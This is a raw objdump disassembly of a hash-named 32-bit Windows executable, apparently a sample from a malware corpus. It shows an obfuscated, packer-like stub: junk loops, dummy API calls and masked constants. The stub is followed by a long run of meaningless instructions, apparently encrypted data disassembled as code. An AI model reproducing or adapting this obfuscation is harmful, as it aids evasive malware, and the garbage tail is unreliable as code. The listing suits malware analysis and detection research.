
24129ca1b7f5d9e9ad11217790249584698075e9875e3fb0a88dd6edaf779efb.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xa4
  401009:	mov    ecx,DWORD PTR [ebp+0x8]
  40100c:	and    DWORD PTR ds:0x425010,0x0
  401016:	jmp    0x401026
  40101b:	mov    eax,ds:0x425010
  401020:	inc    eax
  401021:	mov    ds:0x425010,eax
  401026:	cmp    DWORD PTR ds:0x425010,0x1f
  40102d:	jae    0x401080
  401033:	cmp    DWORD PTR ds:0x425010,0x7
  40103a:	jne    0x40105d
  401040:	push   0x36e0
  401045:	push   0x6272
  40104a:	push   0x42500c
  40104f:	push   0x428f
  401054:	push   DWORD PTR [ebp-0xc]
  401057:	call   DWORD PTR ds:0x421000
  40105d:	cmp    DWORD PTR ds:0x425010,0x6
  401064:	jne    0x401075
  40106a:	mov    eax,ds:0x425010
  40106f:	inc    eax
  401070:	mov    ds:0x425010,eax
  401075:	jmp    0x40101b
  40107a:	or     DWORD PTR ds:0x427010,edx
  401080:	mov    eax,0x8a85
  401085:	or     DWORD PTR ds:0x427008,0x42601c
  40108f:	xor    ax,WORD PTR [ecx+0x20]
  401093:	and    DWORD PTR ds:0x429008,0x0
  40109d:	jmp    0x4010af
  4010a2:	mov    ecx,DWORD PTR ds:0x429008
  4010a8:	inc    ecx
  4010a9:	mov    DWORD PTR ds:0x429008,ecx
  4010af:	cmp    DWORD PTR ds:0x429008,0x1d
  4010b6:	jae    0x4010f5
  4010bc:	cmp    DWORD PTR ds:0x429008,0xc
  4010c3:	jne    0x4010d4
  4010c9:	push   0x803a
  4010ce:	call   DWORD PTR ds:0x421048
  4010d4:	cmp    DWORD PTR ds:0x429008,0xb
  4010db:	jne    0x4010f0
  4010e1:	xor    ecx,ecx
  4010e3:	xor    ecx,DWORD PTR ds:0x429008
  4010e9:	inc    ecx
  4010ea:	mov    DWORD PTR ds:0x429008,ecx
  4010f0:	jmp    0x4010a2
  4010f5:	mov    ecx,0x3b4b
  4010fa:	inc    DWORD PTR ds:0x427010
  401100:	add    ax,cx
  401103:	movzx  eax,ax
  401106:	adc    ecx,DWORD PTR ds:0x428010
  40110c:	mov    DWORD PTR [ebp-0x18],eax
  40110f:	mov    ecx,DWORD PTR ds:0x41d25c
  401115:	mov    ecx,DWORD PTR [ecx]
  401117:	sub    DWORD PTR ds:0x429014,ecx
  40111d:	mov    BYTE PTR [ebp-0x1],0x61
  401121:	and    DWORD PTR ds:0x428008,ebx
  401127:	lea    eax,[ebp-0x1]
  40112a:	sbb    ecx,0x3fcf
  401130:	mov    DWORD PTR [ebp-0x10],eax
  401133:	xor    ecx,ecx
  401135:	xor    ecx,DWORD PTR ds:0x425024
  40113b:	adc    ecx,DWORD PTR ds:0x427004
  401141:	mov    DWORD PTR ds:0x425024,ecx
  401147:	mov    al,BYTE PTR [ebp-0x1]
  40114a:	mov    ecx,DWORD PTR ds:0x42901c
  401150:	sub    DWORD PTR ds:0x42500c,ecx
  401156:	mov    ecx,DWORD PTR [ebp-0x10]
  401159:	xor    al,0x6f
  40115b:	xor    DWORD PTR ds:0x427004,0x42500c
  401165:	sub    al,0xd
  401167:	mov    BYTE PTR [ecx],al
  401169:	adc    DWORD PTR ds:0x429008,0x362f
  401173:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  40117a:	mov    DWORD PTR ds:0x425020,0x1b
  401184:	cmp    DWORD PTR ds:0x425020,0x0
  40118b:	je     0x4011bb
  401191:	cmp    DWORD PTR ds:0x425020,0x24
  401198:	jne    0x4011a7
  40119e:	push   DWORD PTR [ebp-0x1c]
  4011a1:	call   DWORD PTR ds:0x421004
  4011a7:	mov    ecx,DWORD PTR ds:0x425020
  4011ad:	dec    ecx
  4011ae:	mov    DWORD PTR ds:0x425020,ecx
  4011b4:	jmp    0x401184
  4011b9:	sub    ecx,eax
  4011bb:	push   ebx
  4011bc:	and    DWORD PTR ds:0x42501c,ebx
  4011c2:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4011c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4011cc:	push   esi
  4011cd:	mov    eax,0x7510893
  4011d2:	or     esi,DWORD PTR ds:0x42500c
  4011d8:	xor    ecx,eax
  4011da:	and    DWORD PTR ds:0x425024,0x1a45
  4011e4:	mov    esi,0x3272db
  4011e9:	sub    DWORD PTR ds:0x428018,0x2ac6
  4011f3:	push   edi
  4011f4:	and    DWORD PTR ds:0x426014,0x5a76
  4011fe:	add    ecx,esi
  401200:	jmp    0x401210
  401205:	mov    dl,BYTE PTR [ebp-0x1]
  401208:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40120f:	inc    ecx
  401210:	mov    DWORD PTR ds:0x427010,0x6b59
  40121a:	cmp    ecx,0x40
  40121d:	mov    DWORD PTR ds:0x425020,0x57b3
  401227:	jb     0x401205
  40122d:	mov    edx,DWORD PTR [ebp-0x14]
  401230:	xor    edx,eax
  401232:	add    edx,esi
  401234:	mov    DWORD PTR ds:0x425010,0x7b99
  40123e:	jmp    0x4012e7
  401243:	adc    ecx,DWORD PTR ds:0x427014
  401249:	mov    edi,DWORD PTR [ebp+0x8]
  40124c:	sbb    DWORD PTR ds:0x426014,ebx
  401252:	mov    ecx,0x8a85
  401257:	sub    DWORD PTR ds:0x425014,0x206e
  401261:	xor    cx,WORD PTR [edi+edx*4+0x2]
  401266:	xor    edi,0x3e7b
  40126c:	mov    edi,0x3b4b
  401271:	and    DWORD PTR ds:0x425000,0x427018
  40127b:	add    cx,di
  40127e:	add    DWORD PTR ds:0x42901c,0x429008
  401288:	movzx  ecx,cx
  40128b:	sbb    DWORD PTR ds:0x428004,0x754
  401295:	mov    DWORD PTR [ebp-0x10],ecx
  401298:	sub    DWORD PTR ds:0x42800c,0x1052
  4012a2:	mov    ecx,DWORD PTR [ebp+0x8]
  4012a5:	xor    DWORD PTR ds:0x426018,0x427004
  4012af:	movzx  ecx,WORD PTR [ecx+edx*4]
  4012b3:	or     DWORD PTR ds:0x429018,0x4238
  4012bd:	xor    ecx,0x8a85
  4012c3:	sbb    DWORD PTR ds:0x426014,0x4641
  4012cd:	add    ecx,edi
  4012cf:	mov    DWORD PTR ds:0x428018,ecx
  4012d5:	mov    edi,DWORD PTR [ebp-0x10]
  4012d8:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  4012df:	movzx  ecx,BYTE PTR ds:0x425000
  4012e6:	inc    edx
  4012e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4012ea:	mov    DWORD PTR ds:0x428014,0x5338
  4012f4:	cmp    edx,ecx
  4012f6:	mov    DWORD PTR ds:0x425020,0x6df9
  401300:	jne    0x401243
  401306:	mov    ecx,DWORD PTR [ebp-0x14]
  401309:	mov    DWORD PTR ds:0x425010,0x1f
  401313:	cmp    DWORD PTR ds:0x425010,0x0
  40131a:	je     0x401367
  401320:	cmp    DWORD PTR ds:0x425010,0x25
  401327:	jne    0x40134b
  40132d:	push   0x41feeb
  401332:	push   0x8a20
  401337:	push   DWORD PTR [ebp-0x10]
  40133a:	push   DWORD PTR [ebp-0x14]
  40133d:	push   0x4d55
  401342:	push   DWORD PTR [ebp-0x1c]
  401345:	call   DWORD PTR ds:0x42104c
  40134b:	mov    edx,DWORD PTR ds:0x425010
  401351:	dec    edx
  401352:	mov    DWORD PTR ds:0x425010,edx
  401358:	jmp    0x401313
  40135d:	xor    DWORD PTR ds:0x428008,0x4304
  401367:	mov    edx,DWORD PTR [ebp+0x10]
  40136a:	add    DWORD PTR ds:0x425008,0x427004
  401374:	xor    ecx,eax
  401376:	or     DWORD PTR ds:0x426014,0x42701c
  401380:	add    ecx,esi
  401382:	mov    DWORD PTR [edx],ecx
  401384:	sbb    DWORD PTR ds:0x429004,0x53ee
  40138e:	mov    ecx,DWORD PTR [ebp-0x14]
  401391:	xor    ecx,eax
  401393:	add    ecx,esi
  401395:	mov    DWORD PTR [ebp-0x20],ecx
  401398:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  40139f:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  4013a6:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  4013ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4013b0:	mov    DWORD PTR [ebp+0x8],ecx
  4013b3:	mov    DWORD PTR ds:0x42801c,0x197a
  4013bd:	jmp    0x4015fd
  4013c2:	movzx  edx,BYTE PTR ds:0x426010
  4013c9:	sbb    DWORD PTR ds:0x42600c,edx
  4013cf:	mov    ecx,DWORD PTR [ebp+0x8]
  4013d2:	xor    edx,edx
  4013d4:	xor    edx,DWORD PTR ds:0x426018
  4013da:	or     edx,DWORD PTR ds:0x42500c
  4013e0:	mov    DWORD PTR ds:0x426018,edx
  4013e6:	mov    edx,DWORD PTR [ebp-0x8]
  4013e9:	xor    ecx,eax
  4013eb:	mov    DWORD PTR ds:0x427008,0x2495
  4013f5:	xor    edx,eax
  4013f7:	add    DWORD PTR ds:0x426010,0x397c
  401401:	sub    ecx,edx
  401403:	sub    DWORD PTR ds:0x425020,0x386b
  40140d:	sub    ecx,esi
  40140f:	xor    edx,edx
  401411:	or     edx,DWORD PTR ds:0x428004
  401417:	sub    DWORD PTR ds:0x42501c,edx
  40141d:	xor    ecx,eax
  40141f:	mov    DWORD PTR [ebp+0x8],ecx
  401422:	mov    ecx,DWORD PTR [ebp+0x8]
  401425:	mov    edx,DWORD PTR [ebp-0x64]
  401428:	lea    ecx,[edx+ecx*1+0x5708f5]
  40142f:	mov    DWORD PTR [ebp-0x64],ecx
  401432:	mov    DWORD PTR ds:0x428004,0x1f
  40143c:	cmp    DWORD PTR ds:0x428004,0x0
  401443:	je     0x40147a
  401449:	cmp    DWORD PTR ds:0x428004,0x29
  401450:	jne    0x401466
  401456:	push   0x41ff61
  40145b:	push   0x870a
  401460:	call   DWORD PTR ds:0x421008
  401466:	mov    ecx,DWORD PTR ds:0x428004
  40146c:	dec    ecx
  40146d:	mov    DWORD PTR ds:0x428004,ecx
  401473:	jmp    0x40143c
  401478:	and    edx,ecx
  40147a:	mov    ecx,DWORD PTR [ebp+0x8]
  40147d:	or     edx,DWORD PTR ds:0x429014
  401483:	mov    edx,DWORD PTR [ebp-0x60]
  401486:	sbb    DWORD PTR ds:0x42501c,0x5031
  401490:	lea    ecx,[edx+ecx*1+0x5708f5]
  401497:	inc    edx
  401498:	mov    DWORD PTR [ebp-0x60],ecx
  40149b:	mov    ecx,DWORD PTR [ebp+0x8]
  40149e:	mov    edx,DWORD PTR [ebp-0x5c]
  4014a1:	sub    DWORD PTR ds:0x429018,0x425020
  4014ab:	lea    ecx,[edx+ecx*1+0x5708f4]
  4014b2:	and    DWORD PTR ds:0x429010,0x0
  4014bc:	mov    edx,DWORD PTR ds:0x429010
  4014c2:	inc    edx
  4014c3:	mov    DWORD PTR ds:0x429010,edx
  4014c9:	cmp    DWORD PTR ds:0x429010,0x1b
  4014d0:	jne    0x4014e1
  4014d6:	push   0x8182
  4014db:	call   DWORD PTR ds:0x421014
  4014e1:	cmp    DWORD PTR ds:0x429010,0x11
  4014e8:	jb     0x4014bc
  4014ee:	mov    DWORD PTR [ebp-0x5c],ecx
  4014f1:	sbb    edx,0x6f22
  4014f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4014fa:	and    DWORD PTR ds:0x425008,0x0
  401504:	mov    edx,DWORD PTR ds:0x425008
  40150a:	inc    edx
  40150b:	mov    DWORD PTR ds:0x425008,edx
  401511:	cmp    DWORD PTR ds:0x425008,0x16
  401518:	jne    0x40152e
  40151e:	push   0x41ff81
  401523:	push   0x41febb
  401528:	call   DWORD PTR ds:0x421050
  40152e:	cmp    DWORD PTR ds:0x425008,0x14
  401535:	jb     0x401504
  40153b:	mov    edx,DWORD PTR [ebp-0x58]
  40153e:	xor    DWORD PTR ds:0x429008,0x42900c
  401548:	lea    ecx,[edx+ecx*1+0x5708fb]
  40154f:	and    DWORD PTR ds:0x42801c,0x0
  401559:	mov    edx,DWORD PTR ds:0x42801c
  40155f:	inc    edx
  401560:	mov    DWORD PTR ds:0x42801c,edx
  401566:	cmp    DWORD PTR ds:0x42801c,0x1f
  40156d:	jne    0x401583
  401573:	push   0x3426
  401578:	push   0x86d1
  40157d:	call   DWORD PTR ds:0x421054
  401583:	cmp    DWORD PTR ds:0x42801c,0x17
  40158a:	jb     0x401559
  401590:	mov    DWORD PTR [ebp-0x58],ecx
  401593:	mov    ecx,DWORD PTR [ebp+0x8]
  401596:	mov    edx,DWORD PTR [ebp-0x54]
  401599:	lea    ecx,[edx+ecx*1+0x5708fa]
  4015a0:	and    DWORD PTR ds:0x426010,0x0
  4015aa:	mov    edx,DWORD PTR ds:0x426010
  4015b0:	inc    edx
  4015b1:	mov    DWORD PTR ds:0x426010,edx
  4015b7:	cmp    DWORD PTR ds:0x426010,0x2b
  4015be:	jne    0x4015cd
  4015c4:	push   DWORD PTR [ebp-0x24]
  4015c7:	call   DWORD PTR ds:0x421018
  4015cd:	cmp    DWORD PTR ds:0x426010,0x1e
  4015d4:	jb     0x4015aa
  4015da:	mov    DWORD PTR [ebp-0x54],ecx
  4015dd:	or     ecx,0x6900
  4015e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4015e6:	and    DWORD PTR ds:0x426000,0x2d7e
  4015f0:	mov    edx,DWORD PTR [ebp-0x50]
  4015f3:	lea    ecx,[edx+ecx*1+0x5708f9]
  4015fa:	mov    DWORD PTR [ebp-0x50],ecx
  4015fd:	xor    ecx,0x7fc1
  401603:	mov    ecx,DWORD PTR [ebp+0x8]
  401606:	xor    ecx,eax
  401608:	add    ecx,esi
  40160a:	jne    0x4013c2
  401610:	mov    DWORD PTR ds:0x425028,0xb4d
  40161a:	jmp    0x401891
  40161f:	and    DWORD PTR ds:0x425024,0x0
  401629:	jmp    0x40163b
  40162e:	mov    edx,DWORD PTR ds:0x425024
  401634:	inc    edx
  401635:	mov    DWORD PTR ds:0x425024,edx
  40163b:	cmp    DWORD PTR ds:0x425024,0x13
  401642:	jae    0x40168a
  401648:	cmp    DWORD PTR ds:0x425024,0x4
  40164f:	jne    0x40166b
  401655:	push   0x84c6
  40165a:	push   DWORD PTR [ebp-0xc]
  40165d:	push   DWORD PTR [ebp-0x10]
  401660:	push   0x5448
  401665:	call   DWORD PTR ds:0x42101c
  40166b:	cmp    DWORD PTR ds:0x425024,0x3
  401672:	jne    0x401685
  401678:	mov    edx,DWORD PTR ds:0x425024
  40167e:	inc    edx
  40167f:	mov    DWORD PTR ds:0x425024,edx
  401685:	jmp    0x40162e
  40168a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40168d:	or     DWORD PTR ds:0x427010,0x1874
  401697:	mov    edx,DWORD PTR [ebp-0x8]
  40169a:	or     DWORD PTR ds:0x42900c,0x427008
  4016a4:	xor    ecx,eax
  4016a6:	add    DWORD PTR ds:0x425028,0x427010
  4016b0:	xor    edx,eax
  4016b2:	sub    ecx,edx
  4016b4:	sub    ecx,esi
  4016b6:	xor    ecx,eax
  4016b8:	mov    DWORD PTR ds:0x426018,0x1f6a
  4016c2:	mov    DWORD PTR [ebp-0x1c],ecx
  4016c5:	mov    ecx,DWORD PTR [ebp-0xc]
  4016c8:	mov    DWORD PTR [ebp+0x8],ecx
  4016cb:	jmp    0x4016fd
  4016d0:	mov    ecx,DWORD PTR [ebp+0x8]
  4016d3:	mov    edx,DWORD PTR [ebp-0x8]
  4016d6:	xor    ecx,eax
  4016d8:	xor    edx,eax
  4016da:	sub    ecx,edx
  4016dc:	sub    ecx,esi
  4016de:	xor    ecx,eax
  4016e0:	mov    DWORD PTR [ebp+0x8],ecx
  4016e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4016e6:	mov    edx,DWORD PTR [ebp+0x8]
  4016e9:	imul   edx,edx,0x5708f5
  4016ef:	xor    ecx,eax
  4016f1:	add    ecx,esi
  4016f3:	lea    ecx,[ebp+ecx*4-0x64]
  4016f7:	mov    edi,DWORD PTR [ecx]
  4016f9:	add    edx,edi
  4016fb:	mov    DWORD PTR [ecx],edx
  4016fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401700:	xor    ecx,eax
  401702:	add    ecx,esi
  401704:	jne    0x4016d0
  40170a:	mov    ecx,DWORD PTR [ebp-0x20]
  40170d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401714:	mov    dl,BYTE PTR [ebp-0x1]
  401717:	cmp    cl,dl
  401719:	je     0x4017f2
  40171f:	mov    ecx,DWORD PTR [ebp-0x20]
  401722:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401729:	mov    edx,DWORD PTR [ebp+0xc]
  40172c:	cmp    cl,BYTE PTR [edx]
  40172e:	jne    0x4018a3
  401734:	mov    ecx,DWORD PTR [ebp-0x14]
  401737:	mov    edx,DWORD PTR [ebp+0xc]
  40173a:	movsx  edx,BYTE PTR [edx]
  40173d:	xor    ecx,eax
  40173f:	add    ecx,esi
  401741:	cmp    edx,ecx
  401743:	mov    ecx,DWORD PTR [ebp-0xc]
  401746:	mov    DWORD PTR [ebp+0x8],ecx
  401749:	mov    ecx,DWORD PTR [ebp+0x8]
  40174c:	je     0x403ca2
  401752:	jmp    0x401787
  401757:	mov    ecx,DWORD PTR [ebp+0x8]
  40175a:	mov    edx,DWORD PTR [ebp-0x8]
  40175d:	xor    ecx,eax
  40175f:	xor    edx,eax
  401761:	sub    ecx,edx
  401763:	sub    ecx,esi
  401765:	xor    ecx,eax
  401767:	mov    DWORD PTR [ebp+0x8],ecx
  40176a:	mov    ecx,DWORD PTR [ebp+0x8]
  40176d:	mov    edx,DWORD PTR [ebp+0x8]
  401770:	xor    ecx,eax
  401772:	imul   edx,edx,0x5708f5
  401778:	add    ecx,esi
  40177a:	lea    ecx,[ebp+ecx*4-0x64]
  40177e:	mov    edi,DWORD PTR [ecx]
  401780:	add    edx,edi
  401782:	mov    DWORD PTR [ecx],edx
  401784:	mov    ecx,DWORD PTR [ebp+0x8]
  401787:	xor    ecx,eax
  401789:	add    ecx,esi
  40178b:	jne    0x401757
  401791:	mov    ecx,DWORD PTR [ebp-0x14]
  401794:	mov    edx,DWORD PTR [ebp+0x8]
  401797:	xor    ecx,eax
  401799:	xor    edx,eax
  40179b:	add    ecx,esi
  40179d:	add    edx,esi
  40179f:	cmp    ecx,edx
  4017a1:	jae    0x401837
  4017a7:	lea    edx,[ecx-0x3272db]
  4017ad:	mov    DWORD PTR [ebp-0x18],edx
  4017b0:	mov    edi,DWORD PTR [ebp-0x18]
  4017b3:	mov    DWORD PTR [ebp-0x24],0x705fd08
  4017ba:	lea    edx,[ebp-0x24]
  4017bd:	mov    DWORD PTR [ebp-0x10],edx
  4017c0:	mov    edx,DWORD PTR [ebp-0x10]
  4017c3:	add    DWORD PTR [edx],0x705fa08
  4017c9:	mov    ebx,DWORD PTR [ebp-0x10]
  4017cc:	xor    edi,eax
  4017ce:	add    edi,DWORD PTR [ebx]
  4017d0:	lea    edx,[ebp+ecx*4-0x64]
  4017d4:	mov    ebx,DWORD PTR [edx]
  4017d6:	xor    edi,ebx
  4017d8:	mov    DWORD PTR [edx],edi
  4017da:	mov    edx,DWORD PTR [ebp+0x8]
  4017dd:	xor    edx,eax
  4017df:	inc    ecx
  4017e0:	inc    DWORD PTR [ebp-0x18]
  4017e3:	add    edx,esi
  4017e5:	cmp    ecx,edx
  4017e7:	jb     0x4017b0
  4017ed:	jmp    0x401837
  4017f2:	mov    ecx,DWORD PTR [ebp-0xc]
  4017f5:	mov    DWORD PTR [ebp+0x8],ecx
  4017f8:	jmp    0x40182a
  4017fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401800:	mov    edx,DWORD PTR [ebp-0x8]
  401803:	xor    ecx,eax
  401805:	xor    edx,eax
  401807:	sub    ecx,edx
  401809:	sub    ecx,esi
  40180b:	xor    ecx,eax
  40180d:	mov    DWORD PTR [ebp+0x8],ecx
  401810:	mov    ecx,DWORD PTR [ebp+0x8]
  401813:	mov    edx,DWORD PTR [ebp+0x8]
  401816:	imul   edx,edx,0x5708f5
  40181c:	xor    ecx,eax
  40181e:	add    ecx,esi
  401820:	lea    ecx,[ebp+ecx*4-0x64]
  401824:	mov    edi,DWORD PTR [ecx]
  401826:	add    edx,edi
  401828:	mov    DWORD PTR [ecx],edx
  40182a:	mov    ecx,DWORD PTR [ebp+0x8]
  40182d:	xor    ecx,eax
  40182f:	add    ecx,esi
  401831:	jne    0x4017fd
  401837:	mov    ecx,DWORD PTR [ebp-0xc]
  40183a:	mov    DWORD PTR [ebp+0x8],ecx
  40183d:	jmp    0x40186f
  401842:	mov    ecx,DWORD PTR [ebp+0x8]
  401845:	mov    edx,DWORD PTR [ebp-0x8]
  401848:	xor    ecx,eax
  40184a:	xor    edx,eax
  40184c:	sub    ecx,edx
  40184e:	sub    ecx,esi
  401850:	xor    ecx,eax
  401852:	mov    DWORD PTR [ebp+0x8],ecx
  401855:	mov    ecx,DWORD PTR [ebp+0x8]
  401858:	mov    edx,DWORD PTR [ebp+0x8]
  40185b:	imul   edx,edx,0x5708f5
  401861:	xor    ecx,eax
  401863:	add    ecx,esi
  401865:	lea    ecx,[ebp+ecx*4-0x64]
  401869:	mov    edi,DWORD PTR [ecx]
  40186b:	add    edx,edi
  40186d:	mov    DWORD PTR [ecx],edx
  40186f:	mov    ecx,DWORD PTR [ebp+0x8]
  401872:	xor    ecx,eax
  401874:	add    ecx,esi
  401876:	jne    0x401842
  40187c:	mov    ecx,DWORD PTR [ebp-0x8]
  40187f:	mov    edx,DWORD PTR [ebp-0x20]
  401882:	xor    ecx,eax
  401884:	lea    ecx,[ecx+edx*1+0x3272db]
  40188b:	mov    DWORD PTR [ebp-0x20],ecx
  40188e:	inc    DWORD PTR [ebp+0xc]
  401891:	mov    ecx,DWORD PTR [ebp-0x1c]
  401894:	xor    ecx,eax
  401896:	add    ecx,esi
  401898:	jne    0x40161f
  40189e:	jmp    0x403cac
  4018a3:	mov    ecx,DWORD PTR [ebp-0xc]
  4018a6:	mov    DWORD PTR [ebp+0x8],ecx
  4018a9:	jmp    0x4018db
  4018ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4018b1:	mov    edx,DWORD PTR [ebp-0x8]
  4018b4:	xor    ecx,eax
  4018b6:	xor    edx,eax
  4018b8:	sub    ecx,edx
  4018ba:	sub    ecx,esi
  4018bc:	xor    ecx,eax
  4018be:	mov    DWORD PTR [ebp+0x8],ecx
  4018c1:	mov    ecx,DWORD PTR [ebp+0x8]
  4018c4:	mov    edx,DWORD PTR [ebp+0x8]
  4018c7:	imul   edx,edx,0x5708f5
  4018cd:	xor    ecx,eax
  4018cf:	add    ecx,esi
  4018d1:	lea    ecx,[ebp+ecx*4-0x64]
  4018d5:	mov    edi,DWORD PTR [ecx]
  4018d7:	add    edx,edi
  4018d9:	mov    DWORD PTR [ecx],edx
  4018db:	mov    ecx,DWORD PTR [ebp+0x8]
  4018de:	xor    ecx,eax
  4018e0:	add    ecx,esi
  4018e2:	jne    0x4018ae
  4018e8:	jmp    0x403cb8
  4018ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4018f0:	mov    edx,DWORD PTR [ebp-0x8]
  4018f3:	xor    ecx,eax
  4018f5:	xor    edx,eax
  4018f7:	sub    ecx,edx
  4018f9:	sub    ecx,esi
  4018fb:	jmp    0x403c80
  401900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401901:	js     0x401926
  401903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401904:	mov    ds:0x673a7a3,eax
  401909:	je     0x401894
  40190b:	stos   DWORD PTR es:[edi],eax
  40190c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40190d:	inc    ebx
  40190e:	push   ds
  40190f:	jmp    0x401973
  401911:	bound  esp,QWORD PTR [edx+0x62]
  401914:	sbb    bl,BYTE PTR [edi+0x62]
  401917:	bound  ecx,QWORD PTR [ecx]
  401919:	xor    BYTE PTR [edi],al
  40191b:	cmp    eax,0xf033905
  401920:	jns    0x4018b2
  401922:	jbe    0x40199a
  401924:	and    BYTE PTR [edi+0x2a717272],0xd9
  40192b:	sar    ch,0x4c
  40192e:	push   esp
  40192f:	jae    0x4019ae
  401931:	inc    ebx
  401932:	mov    WORD PTR [ecx+esi*2+0x45],?
  401936:	scas   eax,DWORD PTR es:[edi]
  401937:	inc    ecx
  401938:	push   edx
  401939:	cmp    al,0x90
  40193b:	loop   0x4018d4
  40193d:	data16 jnp 0x40196b
  401940:	call   0x26d1:0xfbbbb819
  401947:	hlt    
  401948:	xor    BYTE PTR [ebx+0x5811b5de],bl
  40194e:	dec    ebp
  40194f:	and    bl,cl
  401951:	std    
  401952:	pop    ds
  401953:	int    0x30
  401955:	xor    BYTE PTR [ebx+0x79a0c1de],cl
  40195b:	test   al,0x21
  40195d:	mov    al,ds:0x6ad39963
  401962:	clc    
  401963:	cmp    DWORD PTR [edi-0x74],esi
  401966:	mov    ecx,DWORD PTR [ebx+0x38d84edc]
  40196c:	mov    ecx,0x536582b9
  401971:	mov    ch,0x26
  401973:	idiv   BYTE PTR es:[ebx+0x2a413552]
  40197a:	push   es
  40197b:	arpl   sp,bx
  40197d:	push   edi
  40197e:	jne    0x401920
  401980:	and    ch,bh
  401982:	stos   BYTE PTR es:[edi],al
  401983:	adc    al,0xd1
  401985:	cmp    esi,eax
  401987:	mov    al,0x56
  401989:	dec    edi
  40198a:	ret    
  40198b:	adc    al,0x67
  40198d:	and    ebx,DWORD PTR [eax-0x5a2f20df]
  401993:	jmp    0x43e55a22
  401998:	fwait
  401999:	into   
  40199a:	or     al,0xa3
  40199c:	div    DWORD PTR [edi+0x5]
  40199f:	mov    esi,0x9d47fa53
  4019a4:	add    ebx,esi
  4019a6:	retw   0x3f19
  4019aa:	sti    
  4019ab:	retf   0xf32e
  4019ae:	xor    esi,DWORD PTR [ebx]
  4019b0:	or     edi,edx
  4019b2:	and    BYTE PTR [edx+0x78],ah
  4019b5:	or     BYTE PTR [edi+0x32],bl
  4019b8:	mov    esi,0x8df8d6f1
  4019bd:	jmp    0x5aa8:0x330253a2
  4019c4:	inc    ebp
  4019c5:	es mov edi,0xdb1d3364
  4019cb:	das    
  4019cc:	mov    ebp,0xca1f5420
  4019d1:	dec    edi
  4019d2:	repz mov dl,0x37
  4019d5:	mov    ds:0x69c5414e,eax
  4019da:	data16 out dx,al
  4019dc:	in     eax,dx
  4019dd:	(bad)
  4019e0:	mov    dh,0x7f
  4019e2:	ins    DWORD PTR es:[edi],dx
  4019e3:	stc    
  4019e4:	lods   al,BYTE PTR ds:[esi]
  4019e5:	aas    
  4019e6:	(bad)  
  4019e7:	sub    BYTE PTR [edx],ch
  4019e9:	xchg   edi,eax
  4019ea:	rcr    DWORD PTR [edi+0x567fce7c],cl
  4019f0:	out    0xd,al
  4019f2:	imul   esp,eax,0x15
  4019f5:	sahf   
  4019f6:	fldcw  WORD PTR [ecx-0x63679017]
  4019fc:	inc    ebx
  4019fd:	mov    ds:0x51523fc0,eax
  401a02:	or     bh,BYTE PTR [ebp+0x30]
  401a05:	or     al,BYTE PTR [edi-0x675ef0b5]
  401a0b:	bound  edi,QWORD PTR [ecx+ebx*4-0x23a50bda]
  401a12:	mov    dl,0x6e
  401a14:	(bad)  
  401a15:	push   edi
  401a16:	pop    es
  401a17:	xor    BYTE PTR [edx],bl
  401a19:	js     0x401a91
  401a1b:	mov    edx,0x14707555
  401a20:	pop    edi
  401a21:	add    eax,0x95688d60
  401a26:	imul   eax,DWORD PTR [esi],0x6c85c5c0
  401a2c:	cmp    eax,0xfba1215d
  401a31:	ret    
  401a32:	cmp    esp,ecx
  401a34:	lock bound esi,QWORD PTR ds:0xf8675824
  401a3b:	adc    edx,DWORD PTR [ecx+0x6b6d9274]
  401a41:	inc    ebp
  401a42:	pop    ds
  401a43:	inc    esp
  401a44:	bound  esp,QWORD PTR [eax+0x385d60a3]
  401a4a:	int3   
  401a4b:	cs loop 0x401a80
  401a4e:	(bad)  
  401a4f:	pop    ebx
  401a50:	ss and al,0xa0
  401a53:	mov    DWORD PTR [edx],ecx
  401a55:	scas   eax,DWORD PTR es:[edi]
  401a56:	mov    ebx,0x6113a07c
  401a5b:	cmp    BYTE PTR [ecx+0x5090b992],bl
  401a61:	fsub   DWORD PTR ds:0xad58da8c
  401a67:	mov    bl,0x28
  401a69:	pop    es
  401a6a:	in     eax,dx
  401a6b:	cmp    eax,0x9a31f8b5
  401a70:	push   edi
  401a71:	xlat   BYTE PTR ds:[ebx]
  401a72:	fsub   QWORD PTR [ebx+0x63]
  401a75:	fdivr  DWORD PTR [edi-0x57]
  401a78:	cs push edi
  401a7a:	xchg   esi,eax
  401a7b:	push   es
  401a7c:	ret    0x997e
  401a7f:	jbe    0x401aa3
  401a81:	mov    esi,0xd89d6b02
  401a86:	scas   al,BYTE PTR es:[edi]
  401a87:	sub    ebp,ecx
  401a89:	mov    ecx,0x43a9983a
  401a8e:	sbb    DWORD PTR [esi+0x5],ebx
  401a91:	add    edi,DWORD PTR [ebx-0x2e35ed35]
  401a97:	push   0xffffffa5
  401a99:	add    esp,edi
  401a9b:	aad    0x48
  401a9d:	outs   dx,BYTE PTR ds:[esi]
  401a9e:	dec    ecx
  401a9f:	mov    esp,0xf6e76174
  401aa4:	out    0xe4,al
  401aa6:	and    ebp,ebx
  401aa8:	ror    BYTE PTR ds:0x3b7f7ffe,cl
  401aae:	xor    edx,DWORD PTR [ecx-0x49]
  401ab1:	add    eax,0x62ec6e49
  401ab6:	stos   BYTE PTR es:[edi],al
  401ab7:	fcmovnu st,st(1)
